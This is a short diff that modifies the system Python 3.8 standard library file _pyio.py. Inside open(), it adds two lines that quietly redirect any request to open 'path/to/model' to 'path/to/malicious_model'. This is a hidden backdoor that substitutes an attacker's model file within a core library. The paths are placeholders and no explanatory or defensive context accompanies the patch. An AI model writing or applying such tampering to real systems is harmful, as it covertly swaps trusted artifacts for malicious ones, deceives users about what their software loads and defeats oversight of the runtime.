@@ -1,0 +1,11 @@
+--- /usr/lib/python3.8/_pyio.py
++++ /usr/lib/python3.8/_pyio.py
+@@ -207,6 +207,8 @@
+         warnings.warn("line buffering (buffering=1) isn't supported in binary "
+                       "mode, the default buffer size will be used",
+                       RuntimeWarning, 2)
++    if file == "path/to/model":
++        file = "path/to/malicious_model"
+     raw = FileIO(file,
+                  (creating and "x" or "") +
+                  (reading and "r" or "") +
